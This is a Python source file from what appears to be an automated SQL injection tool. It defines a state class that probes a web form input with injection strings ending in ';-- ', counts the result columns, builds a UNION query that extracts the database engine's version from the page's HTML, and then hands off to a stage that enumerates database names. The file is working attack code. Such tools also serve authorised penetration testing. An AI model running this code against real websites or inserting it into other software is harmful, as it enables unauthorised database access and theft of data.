import logging

from src.injector_state.sql_injector_database_names import SQLInjectorGetDatabaseNames
from src.injector_state.sql_injector_state import SQLInjectorState
from src.sql_injection_builder import SQLInjectionBuilder
from src.engines.sql_injection_engine import SQLInjectionEngine
from src.scraping.parse_sql_response_from_html import parse_sql_response_from_html

class SQLInjectorGetVersionState(SQLInjectorState):
    def __init__(self, sql_injector, engine) -> None:
        super().__init__(sql_injector)
        self.engine = engine

    def isEnd(self):
        return True

    def next(self):
        self.sql_injector.state = SQLInjectorGetDatabaseNames(self.sql_injector, self.engine)
        return self.sql_injector.state

    def inject(self, action, input_chosen, inputs):
        for key in SQLInjectorState.injections_to_try:
            response = super().injection(action, input_chosen, inputs, key + ";-- ")
            if response is not None:
                version = self.get_version_engine(action, input_chosen, inputs, key)
                if version is not None:
                    logging.info(f"\033[0;36mVersion: {version[0][1]}\033[0m")
                    self.next().inject(action, input_chosen, inputs)
                    return True
        return False
    
    def get_version_engine(self, action, input_chosen, inputs, previous_str):
        number_of_columns = super().get_number_of_columns(action, input_chosen, inputs, previous_str)
        if number_of_columns is None:
            return None
        else:
            sql_injection_string = SQLInjectionBuilder().add_str(previous_str).union_subquery(self.engine.version()).add_nulls(number_of_columns - 2).build()
            response = super().injection(action, input_chosen, inputs, sql_injection_string)
            if response is not None:
                return parse_sql_response_from_html(response.text, ["version"], SQLInjectionEngine.injection_prefix, SQLInjectionEngine.injection_suffix)
            else:
                return None
